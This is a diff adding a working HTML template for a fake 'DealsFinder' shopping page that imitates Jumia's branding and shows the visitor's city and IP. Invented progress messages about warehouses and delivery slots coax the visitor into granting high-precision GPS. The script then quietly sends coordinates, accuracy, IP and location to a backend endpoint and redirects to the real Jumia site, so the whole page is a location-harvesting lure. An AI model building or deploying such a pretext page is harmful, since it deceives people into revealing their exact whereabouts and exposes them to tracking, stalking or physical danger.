@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Local Deals Finder</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'jumia-orange': '#FF6B00',
+                        'jumia-orange-light': '#FF8A3D',
+                        'jumia-orange-dark': '#E55F00',
+                    },
+                    animation: {
+                        'fade-in': 'fadeIn 0.6s ease-out forwards',
+                        'fade-in-up': 'fadeInUp 0.6s ease-out forwards',
+                        'pulse-slow': 'pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'bounce-subtle': 'bounceSubtle 1s ease-in-out infinite',
+                        'scale-in': 'scaleIn 0.3s ease-out forwards',
+                        'check-draw': 'checkDraw 0.4s ease-out forwards',
+                    },
+                    keyframes: {
+                        fadeIn: { '0%': { opacity: '0' }, '100%': { opacity: '1' } },
+                        fadeInUp: { '0%': { opacity: '0', transform: 'translateY(20px)' }, '100%': { opacity: '1', transform: 'translateY(0)' } },
+                        bounceSubtle: { '0%, 100%': { transform: 'translateY(0)' }, '50%': { transform: 'translateY(-5px)' } },
+                        scaleIn: { '0%': { opacity: '0', transform: 'scale(0.8)' }, '100%': { opacity: '1', transform: 'scale(1)' } },
+                        checkDraw: { '0%': { strokeDashoffset: '24' }, '100%': { strokeDashoffset: '0' } },
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { font-family: 'Segoe UI', system-ui, sans-serif; }
+        .skeleton { background: linear-gradient(90deg, #e5e7eb 25%, #f3f4f6 50%, #e5e7eb 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; }
+        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center bg-white overflow-hidden">
+    <!-- Animated background -->
+    <div class="absolute inset-0 overflow-hidden">
+        <div class="absolute -top-40 -right-40 w-80 h-80 bg-orange-100 rounded-full blur-3xl animate-pulse"></div>
+        <div class="absolute -bottom-40 -left-40 w-80 h-80 bg-orange-100 rounded-full blur-3xl animate-pulse" style="animation-delay: 1s;"></div>
+    </div>
+
+    <div class="relative z-10 w-full max-w-lg mx-auto px-6 py-12">
+        <!-- Logo -->
+        <div class="flex justify-center mb-8 animate-fade-in">
+            <div class="flex items-center gap-2">
+                <div class="w-12 h-12 bg-jumia-orange rounded-lg flex items-center justify-center">
+                    <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14l-5-5 1.41-1.41L12 14.17l4.59-4.58L18 11l-6 6z"/>
+                    </svg>
+                </div>
+                <span class="text-3xl font-bold text-gray-800">DealsFinder</span>
+            </div>
+        </div>
+
+        <!-- Main Card -->
+        <div id="mainCard" class="bg-white rounded-2xl shadow-xl border border-orange-100 overflow-hidden transition-all duration-500">
+            <!-- Loading State -->
+            <div id="loadingState" class="hidden p-8 text-center">
+                <div class="w-16 h-16 mx-auto mb-4">
+                    <svg class="w-full h-full animate-spin text-jumia-orange" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                </div>
+                <p id="progressMessage" class="text-jumia-orange font-medium min-h-[24px]"></p>
+                <div class="h-2 bg-gray-100 rounded-full mt-4 overflow-hidden">
+                    <div id="progressBar" class="h-full bg-gradient-to-r from-jumia-orange to-jumia-orange-light rounded-full transition-all duration-500" style="width: 0%"></div>
+                </div>
+                <div class="flex justify-center mt-4 gap-2">
+                    <div class="w-2 h-2 bg-jumia-orange rounded-full animate-bounce-subtle"></div>
+                    <div class="w-2 h-2 bg-jumia-orange rounded-full animate-bounce-subtle" style="animation-delay: 0.15s;"></div>
+                    <div class="w-2 h-2 bg-jumia-orange rounded-full animate-bounce-subtle" style="animation-delay: 0.3s;"></div>
+                </div>
+            </div>
+
+            <!-- Success State -->
+            <div id="successState" class="hidden p-8 text-center animate-scale-in">
+                <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <svg class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                </div>
+                <h2 class="text-2xl font-bold text-green-600 mb-2">Location Verified!</h2>
+                <p id="accuracyText" class="text-gray-600 mb-4"></p>
+                <p class="text-sm text-gray-500">Redirecting to exclusive local deals...</p>
+            </div>
+
+            <!-- Welcome State -->
+            <div id="welcomeState" class="p-8 pb-4 text-center">
+                <div class="inline-flex items-center justify-center w-16 h-16 bg-orange-100 rounded-full mb-4 animate-bounce-subtle">
+                    <svg class="w-8 h-8 text-jumia-orange" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path>
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                    </svg>
+                </div>
+                
+                <h1 class="text-2xl font-bold text-gray-800 mb-2 animate-fade-in-up" style="animation-delay: 0.1s;">
+                    Welcome, {{ city }} Shopper!
+                </h1>
+                
+                <p class="text-gray-500 animate-fade-in-up" style="animation-delay: 0.2s;">
+                    {% if region %}{{ region }}, {% endif %}{{ country }}
+                </p>
+                
+                <p class="text-sm text-gray-400 mt-2 animate-fade-in-up" style="animation-delay: 0.3s;">
+                    IP: {{ ip }}
+                </p>
+            </div>
+
+            <!-- Action Section -->
+            <div id="actionSection" class="p-8 pt-4">
+                <button id="verifyBtn" onclick="verifyLocation()" class="w-full py-4 px-8 rounded-full font-semibold text-lg transition-all duration-300 flex items-center justify-center gap-3 bg-jumia-orange text-white hover:bg-jumia-orange-dark hover:shadow-lg hover:shadow-orange-500/30 hover:scale-[1.02] active:scale-[0.98] animate-fade-in-up" style="animation-delay: 0.4s;">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+                    </svg>
+                    Verify Location
+                </button>
+                <p class="text-center text-xs text-gray-400 mt-4 animate-fade-in" style="animation-delay: 0.5s;">
+                    Enable high-precision GPS for accurate local deals
+                </p>
+            </div>
+
+            <!-- Error Message -->
+            <div id="errorMessage" class="hidden px-8 py-4 animate-fade-in">
+                <div class="bg-red-50 border border-red-200 rounded-lg p-4 text-center">
+                    <p id="errorText" class="text-red-600 text-sm"></p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="mt-8 text-center animate-fade-in" style="animation-delay: 0.6s;">
+            <p id="precisionLevel" class="text-sm text-gray-400">Precision Level: IP Low (City-level)</p>
+            <p id="coordinates" class="text-xs text-gray-300 mt-1 hidden"></p>
+        </div>
+    </div>
+
+    <script>
+        const cityName = "{{ city }}";
+        let isVerifying = false;
+
+        const progressiveMessages = [
+            { text: `Scanning local warehouses in ${cityName}...`, delay: 0 },
+            { text: 'Checking last-mile delivery slots for your street...', delay: 1500 },
+            { text: `Unlocking exclusive deals for ${cityName} shoppers...`, delay: 3000 },
+            { text: 'Verifying your precise location...', delay: 4500 }
+        ];
+
+        async function verifyLocation() {
+            if (!navigator.geolocation) {
+                showError('Geolocation is not supported by your browser');
+                return;
+            }
+
+            if (isVerifying) return;
+            isVerifying = true;
+
+            showLoading();
+            hideError();
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const gpsData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+
+                    // Store to backend
+                    try {
+                        await fetch('/api/location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                ip_address: "{{ ip }}",
+                                detected_city: "{{ city }}",
+                                region: "{{ region }}",
+                                country: "{{ country }}",
+                                gps_lat: gpsData.latitude,
+                                gps_lon: gpsData.longitude,
+                                gps_accuracy: gpsData.accuracy
+                            })
+                        });
+                    } catch (e) {
+                        console.log('Backend not available');
+                    }
+
+                    // Show success after final message
+                    setTimeout(() => {
+                        showSuccess(gpsData);
+                    }, 1500);
+                },
+                (err) => {
+                    isVerifying = false;
+                    hideLoading();
+                    showWelcome();
+                    switch (err.code) {
+                        case err.PERMISSION_DENIED:
+                            showError('Location permission denied. Please enable location access.');
+                            break;
+                        case err.POSITION_UNAVAILABLE:
+                            showError('Location information unavailable. Please try again.');
+                            break;
+                        case err.TIMEOUT:
+                            showError('Location request timed out. Please try again.');
+                            break;
+                        default:
+                            showError('An unknown error occurred. Please try again.');
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        function showLoading() {
+            document.getElementById('welcomeState').classList.add('hidden');
+            document.getElementById('actionSection').classList.add('hidden');
+            document.getElementById('loadingState').classList.remove('hidden');
+
+            let msgIndex = 0;
+            const progressBar = document.getElementById('progressBar');
+            const progressMsg = document.getElementById('progressMessage');
+
+            function showNext() {
+                if (msgIndex < progressiveMessages.length) {
+                    progressMsg.textContent = progressiveMessages[msgIndex].text;
+                    progressBar.style.width = ((msgIndex + 1) * 25) + '%';
+                    msgIndex++;
+                    if (msgIndex < progressiveMessages.length) {
+                        setTimeout(showNext, 1500);
+                    }
+                }
+            }
+            showNext();
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingState').classList.add('hidden');
+            document.getElementById('progressBar').style.width = '0%';
+        }
+
+        function showWelcome() {
+            document.getElementById('welcomeState').classList.remove('hidden');
+            document.getElementById('actionSection').classList.remove('hidden');
+        }
+
+        function showSuccess(gpsData) {
+            isVerifying = false;
+            hideLoading();
+            document.getElementById('successState').classList.remove('hidden');
+            document.getElementById('accuracyText').textContent = `Precision: ${gpsData.accuracy.toFixed(0)}m accuracy`;
+            document.getElementById('precisionLevel').textContent = 'Precision Level: GPS High';
+            document.getElementById('precisionLevel').classList.add('text-green-600');
+            const coords = document.getElementById('coordinates');
+            coords.textContent = `${gpsData.latitude.toFixed(6)}, ${gpsData.longitude.toFixed(6)}`;
+            coords.classList.remove('hidden');
+
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.href = 'https://www.jumia.com.ng/';
+            }, 2000);
+        }
+
+        function showError(msg) {
+            const errorDiv = document.getElementById('errorMessage');
+            document.getElementById('errorText').textContent = msg;
+            errorDiv.classList.remove('hidden');
+            setTimeout(() => errorDiv.classList.add('hidden'), 5000);
+        }
+
+        function hideError() {
+            document.getElementById('errorMessage').classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
